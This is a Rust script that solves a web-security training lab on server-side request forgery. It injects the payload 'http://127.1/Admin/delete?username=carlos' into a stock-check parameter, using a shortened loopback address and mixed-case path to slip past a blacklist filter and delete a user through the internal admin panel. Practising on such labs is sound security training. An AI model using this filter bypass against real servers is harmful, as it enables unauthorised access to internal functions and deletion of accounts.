/****************************************************************************
*
* Lab: SSRF with blacklist-based filter
*
* Hack Steps:
*      1. Inject payload into 'stockApi' parameter to delete carlos using
*         SSRF with input filter bypass
*      2. Check that carlos doesn't exist anymore in the admin panel
*
*****************************************************************************/
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a8a0098045bbdbf82062a5800bb004d.web-security-academy.net";

fn main() {
    println!("⦗#⦘ Injection point: {}", "stockApi".yellow());
    print!("❯❯ Injecting payload to delete carlos using SSRF with input filter bypass.. ");
    io::stdout().flush().unwrap();

    let payload = "http://127.1/Admin/delete?username=carlos";
    check_stock_with_payload(&payload);

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn check_stock_with_payload(payload: &str) -> Response {
    let cliet = build_web_client();
    cliet
        .post(format!("{LAB_URL}/product/stock"))
        .form(&HashMap::from([("stockApi", &payload)]))
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to fetch the page with the injected payload".red()
        ))
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}
